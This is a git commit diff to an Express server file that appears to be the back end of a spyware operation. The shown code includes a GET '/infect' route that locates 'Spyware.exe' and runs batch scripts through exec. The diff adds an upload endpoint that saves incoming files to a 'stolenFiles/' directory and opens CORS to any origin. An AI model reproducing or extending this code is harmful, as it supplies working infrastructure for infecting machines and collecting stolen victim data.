e7635905d54e00426ac1b86005ef013b5ddee215
idiarj <idiar16@gmail.com>
2025-03-17 01:21:24 -0400

    asdasd

--- app/app.js
+++ app/app.js
@@ -1,15 +1,31 @@
 import { exec } from 'child_process';
 import { ftp } from '../ftp/fptSrv.js';
+import cors from 'cors';
 import express from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
+import multer from 'multer';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+
+
 const app = express();
 app.use(express.json());
+app.use(cors());
 const PORT = 3000;
+
+// Configuración de multer
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, 'stolenFiles/');
+    },
+    filename: (req, file, cb) => {
+        cb(null, `${Date.now()}-${file.originalname}`);
+    }
+});
+const upload = multer({ storage });
 
 app.get('/infect', (req, res) => {
     const spywareExePath = path.join(__dirname, '../Spyware.exe');
@@ -41,17 +57,27 @@ app.get('/infect', (req, res) => {
                     console.error(`Stderr en startServ.bat: ${stderr}`);
                 }
                 console.log(`Resultado startServ.bat: ${stdout}`);
-                res.send('Servidor FTP infectado');
+                res.status(200).json({
+                    message: 'Infection successful'
+                });
             });
         }, 2000);
     });
 });
 
+app.post('/upload', upload.single('file'), (req, res) => {
+    if (!req.file) {
+        return res.status(400).send('No file uploaded.');
+    }
+    console.log(`File uploaded: ${req.file.filename}`);
+    res.send(`File uploaded: ${req.file.filename}`);
+});
+
 app.listen(PORT, () => {
     console.log(`Server running at http://localhost:${PORT}`);
-    ftp.start().then(() => {
-        console.log('FTP server started successfully');
-    }).catch((error) => {
-        console.error('Failed to start FTP server:', error);
-    });
+    // ftp.start().then(() => {
+    //     console.log('FTP server started successfully');
+    // }).catch((error) => {
+    //     console.error('Failed to start FTP server:', error);
+    // });
 });
